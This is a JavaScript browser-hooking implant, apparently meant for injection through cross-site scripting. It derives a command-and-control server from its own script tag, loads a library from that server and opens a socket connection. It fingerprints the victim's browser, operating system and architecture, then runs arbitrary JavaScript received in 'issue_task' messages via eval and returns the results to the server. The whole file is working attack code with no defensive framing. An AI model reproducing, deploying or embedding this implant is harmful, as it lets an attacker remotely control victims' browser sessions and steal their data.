var scriptsrc = document.getElementById("hacker").getAttribute("src");
var c2server = scriptsrc.substring(0, scriptsrc.length - 11);
var mysocket;
(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) {
        return;
    }
    js = d.createElement(s);
    js.id = id;
    js.onload = function() {
        $(document).ready(function() {
            mysocket = io.connect(c2server + '/');
            mysocket.on('connect', function(data){
				console.log("connect");
				var navUserAgent = navigator.userAgent;
				var browserName  = navigator.appName;
				var browserVersion  = ''+parseFloat(navigator.appVersion); 
				var majorVersion = parseInt(navigator.appVersion,10);
				var tempNameOffset,tempVersionOffset,tempVersion;
				if ((tempVersionOffset=navUserAgent.indexOf("Opera"))!=-1) {
				 browserName = "Opera";
				 browserVersion = navUserAgent.substring(tempVersionOffset+6);
				 if ((tempVersionOffset=navUserAgent.indexOf("Version"))!=-1) 
				   browserVersion = navUserAgent.substring(tempVersionOffset+8);
				} else if ((tempVersionOffset=navUserAgent.indexOf("MSIE"))!=-1) {
				 browserName = "Microsoft Internet Explorer";
				 browserVersion = navUserAgent.substring(tempVersionOffset+5);
				} else if ((tempVersionOffset=navUserAgent.indexOf("Chrome"))!=-1) {
				 browserName = "Chrome";
				 browserVersion = navUserAgent.substring(tempVersionOffset+7);
				} else if ((tempVersionOffset=navUserAgent.indexOf("Safari"))!=-1) {
				 browserName = "Safari";
				 browserVersion = navUserAgent.substring(tempVersionOffset+7);
				 if ((tempVersionOffset=navUserAgent.indexOf("Version"))!=-1) 
				   browserVersion = navUserAgent.substring(tempVersionOffset+8);
				} else if ((tempVersionOffset=navUserAgent.indexOf("Firefox"))!=-1) {
				 browserName = "Firefox";
				 browserVersion = navUserAgent.substring(tempVersionOffset+8);
				} else if ( (tempNameOffset=navUserAgent.lastIndexOf(' ')+1) < (tempVersionOffset=navUserAgent.lastIndexOf('/')) ) {
				 browserName = navUserAgent.substring(tempNameOffset,tempVersionOffset);
				 browserVersion = navUserAgent.substring(tempVersionOffset+1);
				 if (browserName.toLowerCase()==browserName.toUpperCase()) {
				  browserName = navigator.appName;
				 }
				}

				if ((tempVersion=browserVersion.indexOf(";"))!=-1)
				   browserVersion=browserVersion.substring(0,tempVersion);
				if ((tempVersion=browserVersion.indexOf(" "))!=-1)
				   browserVersion=browserVersion.substring(0,tempVersion);
				
				var os = "Unknown";
				if (navigator.appVersion.indexOf("Win") != -1){
					os = "Windows";
				}
				else if (navigator.appVersion.indexOf("Mac") != -1){
					os = "MacOS";
				}
				else if (navigator.appVersion.indexOf("Linux") != -1){
					os = "Linux";
				}
				else if (navigator.appVersion.indexOf("X11") != -1){
					os = "Unix";
				}
				var arch = "";
				if (navigator.appVersion.indexOf("x86_64") != -1){
					arch = "x86_64";
				}
				else if (navigator.appVersion.indexOf("i686") != -1){
					arch = "i686";
				}
				mysocket.emit('new session', {'arch': arch, 'os': os, 'version': browserName+' '+browserVersion});
				console.log(browserName +browserVersion);
			});

            function sendOutput(taskid, message, type='cmd') {
				console.log("dans sendoutput");
				if (type=='cmd')
				{
					mysocket.emit('task_output_cmd', {
						id: taskid,
						output: String(message)
					});
					return false;				
				}
				else{
					mysocket.emit('task_output', {
						id: taskid,
						output: String(message)
					});
					return false;
				}
            };
            mysocket.on('issue_task', function(msg) {
				console.log("Commande recue");
                id = msg['id'];
                console.log(msg['input']);
                try {
                    var cmdout = eval(String(msg['input'])); //do the task
                    if (String(msg['input']).includes('sendOutput') == false) {
                        sendOutput(id, cmdout, type=msg['type']);
                    }
                } catch (err) {
                    sendOutput(id, err, type=msg['type']);
                }
            });
            mysocket.on('test', function(msg){
				console.log("dans test");
				console.log(msg);
			});
        });
    };
    js.src = c2server + "/includes.js";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'xss-includes'));
